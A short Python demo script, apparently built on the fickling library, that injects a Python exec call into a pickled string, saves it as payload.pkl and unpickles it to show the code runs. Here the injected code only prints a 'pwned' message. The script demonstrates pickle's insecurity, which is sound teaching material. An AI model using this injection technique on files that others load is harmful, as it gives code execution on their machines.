from fickling.pickle import Pickled
import pickle

# Create a malicious pickle
data = "my friend needs to know this"

pickle_bin = pickle.dumps(data)

p = Pickled.load(pickle_bin)

p.insert_python_exec('print("you\'ve been pwned !")')

with open('payload.pkl', 'wb') as f:
    p.dump(f)

# innocently unpickle and get your friend's data
with open('payload.pkl', 'rb') as f:
    data = pickle.load(f)
    print(data)

# cat payload.pkl
# hexyl payload.pkl
